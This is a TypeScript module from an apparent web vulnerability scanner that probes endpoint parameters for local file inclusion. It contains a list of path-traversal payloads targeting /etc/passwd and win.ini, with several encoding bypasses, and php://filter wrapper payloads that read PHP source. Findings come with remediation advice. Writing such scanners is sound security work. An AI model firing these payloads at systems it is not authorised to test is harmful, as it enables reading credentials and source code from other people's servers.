import type { ScanModuleInterface, EndpointInfo, ModuleFinding } from '../scanner/orchestrator';
import type { HttpClient } from '../scanner/http-client';

const FILE_PARAMS = ['file', 'page', 'include', 'path', 'doc', 'document', 'folder', 'root', 'pg', 'style', 'pdf', 'template', 'php_path', 'lang', 'language', 'dir', 'action', 'board', 'date', 'detail', 'download', 'prefix', 'content', 'layout', 'mod', 'conf', 'view', 'load', 'read'];

const LFI_PAYLOADS = [
  { payload: '../../../etc/passwd', marker: 'root:', os: 'Linux', technique: 'basic traversal' },
  { payload: '....//....//....//etc/passwd', marker: 'root:', os: 'Linux', technique: 'double-dot bypass' },
  { payload: '..%252f..%252f..%252fetc%252fpasswd', marker: 'root:', os: 'Linux', technique: 'double URL encoding' },
  { payload: '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd', marker: 'root:', os: 'Linux', technique: 'UTF-8 overlong encoding' },
  { payload: '..\\..\\..\\..\\windows\\win.ini', marker: '[fonts]', os: 'Windows', technique: 'backslash traversal' },
  { payload: '..%5c..%5c..%5c..%5cwindows%5cwin.ini', marker: '[fonts]', os: 'Windows', technique: 'encoded backslash' },
  { payload: '/etc/passwd', marker: 'root:', os: 'Linux', technique: 'absolute path' },
  { payload: 'C:\\Windows\\win.ini', marker: '[fonts]', os: 'Windows', technique: 'absolute Windows path' },
];

const PHP_WRAPPER_PAYLOADS = [
  { payload: 'php://filter/convert.base64-encode/resource=index', marker_pattern: /^[A-Za-z0-9+/]{20,}={0,2}$/m, technique: 'php://filter base64' },
  { payload: 'php://filter/read=string.rot13/resource=index.php', marker_pattern: /\<\?cuc/i, technique: 'php://filter rot13' },
];

export class FileInclusionModule implements ScanModuleInterface {
  id = 'file-inclusion';
  name = 'File Inclusion (LFI/RFI)';

  async scan(url: string, endpoints: EndpointInfo[], client: HttpClient): Promise<ModuleFinding[]> {
    const findings: ModuleFinding[] = [];
    const tested = new Set<string>();

    for (const ep of endpoints) {
      const paramsToTest = ep.params.filter((p) => FILE_PARAMS.includes(p.toLowerCase()));
      if (paramsToTest.length === 0 && ep.params.length > 0) {
        paramsToTest.push(...ep.params.slice(0, 3));
      }

      for (const param of paramsToTest) {
        const key = `${ep.url}:${param}`;
        if (tested.has(key)) continue;
        tested.add(key);

        // LFI tests
        for (const { payload, marker, os, technique } of LFI_PAYLOADS) {
          const res = await this.inject(ep, param, payload, client);
          if (res.status === 0) continue;

          if (res.body.includes(marker)) {
            findings.push({
              severity: 'critical',
              title: `Local File Inclusion (${os} — ${technique})`,
              description: `The parameter "${param}" is vulnerable to Local File Inclusion. The payload "${payload}" successfully read a system file (detected "${marker}" in response). An attacker can read sensitive configuration files, source code, and potentially achieve Remote Code Execution via log poisoning or PHP wrappers.`,
              url: ep.url, parameter: param,
              remediation: 'Never use user input directly in file include/read operations. Use a whitelist of allowed files. If dynamic paths are needed, validate against a strict regex and use realpath() to prevent traversal.',
              cwe_id: 'CWE-98', owasp_category: 'A03:2021', cvss_score: 9.1,
              evidence: { payload, technique, os, marker_found: marker },
            });
            break;
          }

          // Check for PHP include errors that confirm the parameter is used in include()
          if (/include\(\)|require\(\)|include_once\(\)|Failed opening|file_get_contents/i.test(res.body)) {
            findings.push({
              severity: 'high',
              title: 'File Inclusion Function Detected',
              description: `The parameter "${param}" triggers PHP file inclusion errors, confirming user input is passed to include/require functions. While the specific traversal payload didn't succeed, alternative techniques (encoding bypasses, PHP wrappers) may achieve file read.`,
              url: ep.url, parameter: param,
              remediation: 'Remove user input from file inclusion functions entirely.',
              cwe_id: 'CWE-98', owasp_category: 'A03:2021', cvss_score: 7.5,
              evidence: { payload, error_detected: true },
            });
            break;
          }
        }

        // PHP wrapper tests
        for (const { payload, marker_pattern, technique } of PHP_WRAPPER_PAYLOADS) {
          const res = await this.inject(ep, param, payload, client);
          if (res.status === 0) continue;

          if (marker_pattern.test(res.body)) {
            findings.push({
              severity: 'critical',
              title: `PHP Wrapper File Read (${technique})`,
              description: `The parameter "${param}" accepts PHP stream wrappers. Using "${payload}", the server returned base64-encoded or transformed source code. This allows reading any PHP file's source code, including configuration files with database credentials.`,
              url: ep.url, parameter: param,
              remediation: 'Disable PHP wrappers (allow_url_include=Off) and never pass user input to include functions.',
              cwe_id: 'CWE-98', owasp_category: 'A03:2021', cvss_score: 9.1,
              evidence: { payload, technique, response_preview: res.body.slice(0, 200) },
            });
            break;
          }
        }
      }
    }

    return findings;
  }

  private async inject(ep: EndpointInfo, param: string, payload: string, client: HttpClient) {
    if (ep.method === 'GET') {
      const u = new URL(ep.url);
      u.searchParams.set(param, payload);
      return client.get(u.href);
    }
    const body = ep.params.map((p) => `${encodeURIComponent(p)}=${encodeURIComponent(p === param ? payload : 'test')}`).join('&');
    return client.post(ep.url, body, { 'Content-Type': 'application/x-www-form-urlencoded' });
  }
}
